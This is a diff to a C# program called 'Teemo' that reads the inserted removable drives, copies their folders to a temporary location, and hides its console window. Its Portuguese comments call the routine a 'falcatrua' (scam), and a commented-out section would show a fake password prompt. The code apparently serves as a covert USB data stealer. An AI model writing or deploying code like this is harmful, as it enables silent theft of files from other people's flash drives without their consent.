@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -20,10 +21,29 @@ namespace Teemo
 
         static void Main(/*string[] args*/)
         {
-            var handle = GetConsoleWindow();
+            //Inicia a falcatrua
+            Iniciar();
+
+            /*Console.WriteLine("Digite a sua senha");
+            Console.ReadLine();
+            Console.WriteLine("Obrigado... (Precione qualquer tecla)");
+            Console.ReadKey();*/
+
+            //Cria o diretório Teemo, e abre ele
+            //CaDir(Environment.CurrentDirectory + @"\DTeemo");
+            
+            //Esconde
+            Esconder();
+        }
+
+        private static void Iniciar()
+        {
+            //Lê os drives
             var driveInfo = DriveInfo.GetDrives();
+
+            //Variavel para listar drives removíveis
             var pendrives = driveInfo.Where(d => d.IsReady && d.DriveType == DriveType.Removable);
-            ShowWindow(handle, SwHide);
+            
 
             foreach (var flashDrives in pendrives)
             {
@@ -85,6 +105,27 @@ namespace Teemo
                     DirectoryCopy(subdir.FullName, temppath, true);
                 }
             }
+        }
+
+        private static void CaDir(string dir)
+        {
+            if (!Directory.Exists(dir))
+            {
+                Directory.CreateDirectory(dir);
+                Process.Start(dir);
+            }
+            else
+            {
+                Process.Start(dir);
+            }
+        }
+
+        private static void Esconder()
+        {   
+            //Lê a janela
+            var handle = GetConsoleWindow();
+            //Esconde
+            ShowWindow(handle, SwHide);
         }
     }
 }
